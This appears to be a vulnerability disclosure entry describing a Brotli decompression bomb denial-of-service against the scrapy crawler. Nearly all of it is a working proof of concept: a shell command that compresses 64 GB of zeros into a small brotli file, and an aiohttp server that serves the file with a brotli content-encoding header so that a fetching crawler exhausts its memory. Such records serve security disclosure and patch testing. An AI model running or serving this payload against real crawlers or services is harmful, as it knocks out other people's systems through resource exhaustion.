title: Brotli decompression bomb DoS in scrapy due to insufficient output size validation during decompression
trigger_payload:
dd if=/dev/zero bs=1G count=64 | brotli -9 -o poc64.br
from aiohttp import web
async def handler(req: web.Request) -> web.Response:
    resp = web.Response(content_type="text/plain")
    with open("poc64.br", "rb") as f:
        resp.body = f.read()
    resp.headers["Content-Encoding"] = "br"
    assert not resp.compression
    return resp
if __name__ == "__main__":
    app = web.Application()
    app.router.add_get("/", handler)
    web.run_app(app, port=8080)
